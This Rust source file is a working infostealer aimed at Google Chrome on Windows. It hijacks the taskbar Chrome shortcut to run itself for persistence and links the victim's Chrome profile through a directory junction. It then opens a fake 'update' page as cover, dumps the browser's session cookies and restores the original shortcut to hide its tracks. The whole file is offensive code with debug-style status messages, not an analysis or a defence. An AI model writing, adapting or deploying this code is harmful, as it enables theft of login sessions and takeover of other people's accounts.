use futures::StreamExt;
use chromiumoxide::browser::{Browser, BrowserConfig};
use std::fs;
use std::env;
use std::path::PathBuf;
use std::time::Duration;
use mslnk::ShellLink;

#[async_std::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "debug")]
    println!("[*] Retreaving username...");
    let username = env::var("USERNAME")?;

    let junc_path: PathBuf = PathBuf::from(format!("C:\\temp\\{}", username));

    let chrome_data_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data", username));

    let exe_path = std::env::current_exe()?;
    let exe_path_str = exe_path.to_str().unwrap_or("");

    #[cfg(feature = "debug")]
    println!("[*] Checking if junction exists...");
    if !junction::exists(&junc_path)? {
        #[cfg(feature = "debug")]
        println!("[*] Creating dir junction...");
        junction::create(chrome_data_path, &junc_path)?;

        #[cfg(feature = "debug")]
        println!("[*] Setting up persistence...");

        let shortcut_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username));
        if !shortcut_path.exists() {
            eprintln!("Error: Shortcut does not exist at the specified path.");
            return Ok(());
        }

        #[cfg(feature = "debug")]
        println!("[*] Creating new Chrome shortcut...");
        let target = exe_path_str;
        let start_in = exe_path.parent().and_then(|p| p.to_str()).unwrap_or("");

        let mut link = ShellLink::new(target).unwrap();
        link.set_working_dir(Some(start_in.to_string()));

        println!("\nNew shortcut properties defined:");
        println!("- New Target: {}", target);
        println!("- New 'Start In': {}", start_in);
        link.create_lnk(&shortcut_path)?;

    } else {
        #[cfg(feature = "debug")]
        println!("[*] Starting browser...");
        let (mut browser, mut handler) = Browser::launch(BrowserConfig::builder()
            .with_head()
            .arg("--start-maximized")
            .arg("--no-startup-window")
            .user_data_dir(&junc_path)
            .viewport(None)
            .disable_default_args()
            .build()?
        ).await?;

        let handle = async_std::task::spawn(async move {
            while let Some(h) = handler.next().await {
                match h {
                    Ok(_) => continue,
                                            Err(_) => break,
                }
            }
        });

        // Open page for whats new (simulate update)
        let _ = browser.new_page("https://developer.chrome.com/new").await?;

        #[cfg(feature = "debug")]
        println!("[*] Sleeping (10 secs for test) ...");
        async_std::task::sleep(Duration::from_secs(10)).await;

        #[cfg(feature = "debug")]
        println!("[*] Time is up.");

        #[cfg(feature = "debug")]
        println!("[*] Retrieving cookies...");
        let cookies = browser.get_cookies().await?;

        #[cfg(feature = "debug")]
        println!("[+] Cookies:");
        cookies.iter().for_each(|cookie| println!("[>] Name: {}\n    Domain {}\n    Expires: {}", cookie.name, cookie.domain, cookie.expires));

        browser.close().await?;
        browser.wait().await?;
        handle.await;

        #[cfg(feature = "debug")]
        println!("[*] Removing junction and dir...");
        junction::delete(&junc_path)?;
        fs::remove_dir(&junc_path)?;

        #[cfg(feature = "debug")]
        println!("[*] Restoring Chrome shortcut...");
        let target = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        let start_in = "C:\\Program Files\\Google\\Chrome\\Application";

        let mut link = ShellLink::new(target.to_string())?;
        link.set_working_dir(Some(start_in.to_string()));
        let shortcut_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username));
        link.create_lnk(&shortcut_path)?;
    }

    Ok(())
}
